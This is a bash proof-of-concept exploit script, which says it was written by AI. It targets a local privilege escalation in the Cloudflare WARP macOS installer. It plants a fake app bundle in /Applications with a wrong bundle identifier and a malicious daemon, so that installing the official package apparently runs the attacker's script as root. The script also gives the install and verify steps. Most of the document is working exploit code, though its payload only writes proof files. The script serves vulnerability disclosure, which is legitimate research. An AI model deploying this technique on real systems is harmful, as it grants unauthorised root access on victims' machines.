#!/bin/bash

# Author: SwayZGl1tZyyyy
# im too lazy to write an script by myself, this is made by AI. Run the prepare script 

# 1. save this file as lpe.sh then run this script (bash lpe.sh) 
# After we executed the lpe.sh script, we wait till the Administrator installs the Cloudflare_WARP_2025.9.558.0.pkg.
# 2. victim (user/Administrator) installs the Cloudflare_WARP_2025.9.558.0.pkg
# 3. verify After the installation completes, verify that the attacker-controlled daemon was executed as root by checking the proof file created by the payload:
# cat /tmp/cloudflare_warp_lpe_proof.txt

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

banner() {
    echo -e "${RED}"
    echo "================================================"
    echo "  Cloudflare WARP LPE PoC"
    echo "================================================"
    echo -e "${NC}"
}

check_prerequisites() {
    echo -e "${YELLOW}[*]${NC} Checking prerequisites..."
    
    # Check if running on macOS
    if [[ "$(uname)" != "Darwin" ]]; then
        echo -e "${RED}[-]${NC} This exploit only works on macOS"
        exit 1
    fi
    
    # Check if we have write access to /Applications
    if [[ ! -w "/Applications" ]]; then
        echo -e "${RED}[-]${NC} No write access to /Applications"
        echo "    You need admin privileges to set up the exploit"
        exit 1
    fi
    
    echo -e "${GREEN}[+]${NC} Prerequisites OK"
}

create_malicious_bundle() {
    echo -e "${YELLOW}[*]${NC} Creating malicious app bundle..."
    
    APP_PATH="/Applications/Cloudflare WARP.app"
    CONTENTS_PATH="$APP_PATH/Contents"
    MACOS_PATH="$CONTENTS_PATH/MacOS"
    RESOURCES_PATH="$CONTENTS_PATH/Resources"
    
    # Remove existing if present
    if [ -d "$APP_PATH" ]; then
        echo -e "${YELLOW}[*]${NC} Removing existing malicious bundle..."
        rm -rf "$APP_PATH"
    fi
    
    # Create structure
    mkdir -p "$MACOS_PATH"
    mkdir -p "$RESOURCES_PATH"
    
    # Create malicious daemon (this runs as root!)
    cat > "$RESOURCES_PATH/CloudflareWARP" << 'DAEMON_EOF'
#!/bin/bash

# Proof of privilege escalation
PROOF_FILE="/tmp/cloudflare_warp_lpe_proof.txt"

{
    echo "=========================================="
    echo "PRIVILEGE ESCALATION SUCCESSFUL!"
    echo "=========================================="
    echo "Executed as: $(whoami)"
    echo "UID: $(id -u)"
    echo "GID: $(id -g)"
    echo "Date: $(date)"
    echo "Process: $$"
    echo "PPID: $PPID"
    echo "Parent process: $(ps -p $PPID -o comm=)"
    echo ""
    echo "Full ID info:"
    id
    echo ""
    echo "Environment:"
    env | grep -E "(USER|HOME|PATH)"
    echo "=========================================="
} > "$PROOF_FILE"

chmod 644 "$PROOF_FILE"

# Create additional proof file in /tmp
touch /tmp/root_execution_proof_$(date +%s).txt

# For debugging: log to syslog
logger "Cloudflare WARP LPE PoC executed as $(whoami)"

# Keep daemon running (launchd expects it)
sleep 999999
DAEMON_EOF

    chmod +x "$RESOURCES_PATH/CloudflareWARP"
    
    # Create fake main executable
    cat > "$MACOS_PATH/Cloudflare WARP" << 'MAIN_EOF'
#!/bin/bash
echo "Fake Cloudflare WARP Application"
echo "This is part of the PoC exploit"
MAIN_EOF

    chmod +x "$MACOS_PATH/Cloudflare WARP"
    
    # Create Info.plist with WRONG bundle ID (key to triggering .localized)
    cat > "$CONTENTS_PATH/Info.plist" << 'PLIST_EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Cloudflare WARP</string>
    <key>CFBundleIdentifier</key>
    <string>com.attacker.malicious.warp</string>
    <key>CFBundleName</key>
    <string>Cloudflare WARP</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0.0</string>
    <key>CFBundleVersion</key>
    <string>1</string>
    <key>LSMinimumSystemVersion</key>
    <string>10.13</string>
</dict>
</plist>
PLIST_EOF

    echo -e "${GREEN}[+]${NC} Malicious bundle created at: $APP_PATH"
}

show_bundle_info() {
    echo ""
    echo -e "${YELLOW}[*]${NC} Bundle information:"
    echo "    Location: /Applications/Cloudflare WARP.app"
    echo "    Bundle ID: com.attacker.malicious.warp (WRONG - triggers .localized)"
    echo "    Malicious daemon: Contents/Resources/CloudflareWARP"
    echo ""
}

show_instructions() {
    echo -e "${YELLOW}[*]${NC} Exploit preparation complete!"
    echo ""
    echo -e "${GREEN}Next steps:${NC}"
    echo ""
    echo "1. Download the official Cloudflare WARP installer:"
    echo -e "   ${YELLOW}curl -L -o ~/Downloads/CloudflareWARP.pkg https://1.1.1.1/Cloudflare_WARP.pkg${NC}"
    echo ""
    echo "2. Install the package (this triggers the exploit):"
    echo -e "   ${YELLOW}sudo installer -pkg ~/Downloads/CloudflareWARP.pkg -target /${NC}"
    echo ""
    echo "3. Check if the exploit worked:"
    echo -e "   ${YELLOW}cat /tmp/cloudflare_warp_lpe_proof.txt${NC}"
    echo ""
    echo -e "${RED}Expected vulnerable behavior:${NC}"
    echo "   - Installer detects CFBundleIdentifier mismatch"
    echo "   - macOS creates /Applications/Cloudflare WARP.localized/"
    echo "   - Real app goes to .localized subdirectory"
    echo "   - Postinstall uses \$INSTALL_DIR variable"
    echo "   - Our malicious daemon gets copied and executed as root"
    echo ""
    echo -e "${GREEN}If vulnerable, you'll see:${NC}"
    echo "   - File /tmp/cloudflare_warp_lpe_proof.txt exists"
    echo "   - Contains 'Executed as: root'"
    echo "   - UID: 0"
    echo ""
}

verify_exploit() {
    echo -e "${YELLOW}[*]${NC} Checking for exploitation evidence..."
    
    PROOF_FILE="/tmp/cloudflare_warp_lpe_proof.txt"
    
    if [ -f "$PROOF_FILE" ]; then
        echo -e "${RED}[!] EXPLOIT SUCCESSFUL!${NC}"
        echo ""
        cat "$PROOF_FILE"
        echo ""
        echo -e "${RED}The system is VULNERABLE to privilege escalation!${NC}"
        return 0
    else
        echo -e "${GREEN}[+]${NC} No proof file found (exploit not triggered yet or system not vulnerable)"
        return 1
    fi
}

cleanup() {
    echo ""
    echo -e "${YELLOW}[*]${NC} Cleanup:"
    echo "    To remove the malicious bundle:"
    echo -e "    ${YELLOW}rm -rf '/Applications/Cloudflare WARP.app'${NC}"
    echo ""
    echo "    To remove proof files:"
    echo -e "    ${YELLOW}rm -f /tmp/cloudflare_warp_lpe_proof.txt${NC}"
    echo -e "    ${YELLOW}rm -f /tmp/root_execution_proof_*.txt${NC}"
    echo ""
}

# Main execution
banner
check_prerequisites
create_malicious_bundle
show_bundle_info
show_instructions

# Check if already exploited
if verify_exploit; then
    echo ""
fi

cleanup

echo -e "${YELLOW}[!] This PoC is for educational and security research purposes only.${NC}"
